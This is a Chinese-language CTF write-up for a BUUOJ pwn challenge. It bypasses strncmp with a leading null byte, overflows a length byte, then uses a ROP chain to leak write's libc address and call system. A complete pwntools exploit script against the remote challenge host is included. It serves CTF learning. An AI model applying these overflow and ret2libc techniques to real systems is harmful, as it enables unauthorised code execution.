首先checksec检查安全机制

![image-20200625121418899](https://static.hack1s.fun/images/2021/02/06/image-20200625121418899.png)

这还是很少见的开启Full RELRO的程序

拖到ida看一下主函数的逻辑

![image-20200625123543553](https://static.hack1s.fun/images/2021/02/06/image-20200625123543553.png)

这个函数里面没有溢出点，打开了`/dev/urandom`读出其中4个字节，赋值给`buf`

之后buf再作为一个函数的参数，得到v2

最后再将v2作为参数传入一个函数运行，下面看一下这两个函数的逻辑

![image-20200625123736584](https://static.hack1s.fun/images/2021/02/06/image-20200625123736584.png)

这个函数的参数是buf作为int的值，看到下面有一个`strncmp`的`if`语句，如果值为不为0就会导致直接exit

所以这里需要buf和s的值相等，向上倒推

局部变量buf是在上面`read(0,buf,0x20u)`从stdin输入的0x20个字节内容

而s是在`sprintf(&s,"%ld",a1)`这里被赋值为`a1`，即整个函数的参数，main函数中的`buf`

最终返回的这个v5乍一看不存在赋值的语句，但是实际上看到内存中buf位于`ebp-2Ch`，v5位于`ebp-25h`，而且这里read读取的过程允许读最多0x20的长度，因此是可以覆盖v5字节，控制返回值的

最后看一下上面v2作为参数的函数

![image-20200625125242661](https://static.hack1s.fun/images/2021/02/06/image-20200625125242661.png)

这个函数的输入是上面返回的v5，大小是我们可以控制的

当这个字节的值是127时，可以从stdin读取长度`0xC8`的内容，其他值时就可以读取a1长度的内容

而buf距离ebp有E7h，因此肯定要尽可能的大，这里尽量控制返回值为0xff，必须要求e7h以上才可以



整体思路就是利用`sub_804871F`来溢出控制返回值v5，再利用`sub_80487d0`来溢出拿到shell

但是利用`sub_804871f`的前提是要绕过`strncmp`函数

仔细看一下这个比较

 ```c
v1=strlen(buf);
if(strncmp(buf,&s,v1))
  exit(0);
 ```

这里控制比较长度的v1是利用strlen读取了buf的长度，而这个buf是我们可以人为控制的

并且strlen函数是遇到`\x00`字节就会停止的，因此可以控制v1为0，使得两个比较恒等

```python
payload = '\x00' + 'a'*6 + '\xff'
```

这样就可以溢出`sub_804871F`，控制返回值v5值为0xff



控制了返回值v5之后，在80487d0这个函数这里就可以读取长度ffh的内容了

这里payload就和常规的rop差不多了，首先泄漏write的地址，计算出libc基地址

之后利用gadget搜索跳转到`execve("bin/sh")`即可

首先是填充buf到ebp的e7h，之后填充4个字节的ebp，最后是返回值

这里因为程序之前运行过write，就直接暴露write的地址即可

```python
payload = 'a'*0xe7 + 'a'*4 + write_plt + start + 1 + write_got + 4
```

这个payload执行完成之后会输出write的真实地址，并且再一次回到程序开始运行的地方

之后计算出libc的基地址即可



在得到基地址之后，再一次执行上面的流程，跳到gadget的位置即可

![image-20200625133907380](https://static.hack1s.fun/images/2021/02/06/image-20200625133907380.png)

首先要把控制返回值v5的payload发送一遍，之后的payload应该是下面这样子

```python
payload = 'a'*0xe7 + 'a'*4 + p32(execve_sh)
```



写payload的时候发现符号表里没有main，所以main的地址要用IDA直接看

one_gadget的这些gadget测试之后发现都没有办法成功拿到shell

所以要尝试一下system函数

这就需要再从libc的符号表读出来system的偏移

```python
from pwn import *
from LibcSearcher import *

#io = process('./pwn')
io = remote('node3.buuoj.cn','28595')

elf = ELF('./pwn')

libc = ELF('./libc-2.23.so')

write_plt = elf.plt["write"]
write_got = elf.got["write"]

start = 0x8048825
bin_sh_offset = next(libc.search("bin/sh"))

payload1 = '\x00'+'a'*6+'\xff'

io.sendline(payload1)
io.recvuntil("Correct\n")

payload2 = 'a'*0xe7 + 'a'*4 + p32(write_plt) + p32(start) + p32(1) + p32(write_got) + p32(4)

io.sendline(payload2)

write_real = u32(io.recv(4))


libc_base = write_real - libc.sym["write"]
system_addr = libc_base + libc.sym["system"]

bin_sh_str = libc_base + bin_sh_offset


#execve_sh = libc_base + 0x5f066
# 0x3a80c
# 0x3a80e
# 0x3a812
# 0x3a819
# 0x5f065
# 0x5f066

payload3 = 'a'*0xe7 + 'a'*4 + p32(system_addr) + "AAAA" + p32(bin_sh_str)

io.sendline(payload1)
io.recvline()

io.sendline(payload3)
io.interactive()
```

调用system函数的时候，`aaaa`是system的返回地址，用来占位

